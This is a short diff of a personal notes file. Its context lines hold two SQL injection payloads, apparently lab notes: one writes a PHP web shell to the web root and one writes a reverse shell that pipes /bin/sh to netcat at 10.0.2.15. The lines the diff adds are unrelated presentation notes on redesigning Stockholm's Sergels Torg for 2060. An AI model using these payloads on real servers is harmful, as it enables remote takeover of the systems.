@@ -38,3 +38,12 @@ I can do for
 %' union select 1, '<?php system($_GET["cmd"]); ?>',2,3 into outfile '/var/www/html/php/cmd.php' #
 
 %' union select 1, '<?php system('/bin/sh | nc 10.0.2.15 5566'); ?>',2,3 into outfile '/var/www/html/php/cmd1.php' #
+* Prezentare Vlad
+In order to better represent our vision, we chose Sergels Torg as a reference point for the project. 
+We found that Sergels Torg is a quite dynamic place, and in our vision, the life in 2060 will be less stressful,
+moreover, even more calm. So in order to achieve that, we redesigned Sergels Torg as
+a big amphitheater and we also redesigned the pavement. In terms of agriculture and urban farming,
+we changed the high buildings into farming factories, and in order to take advantage of the place itself,
+we designed an extra facade that brings more space for urban farming to take place in the very center of the 
+city. As mentioned before, the main commercial buildings will be changed by 2060 into stores with local 
+production. 
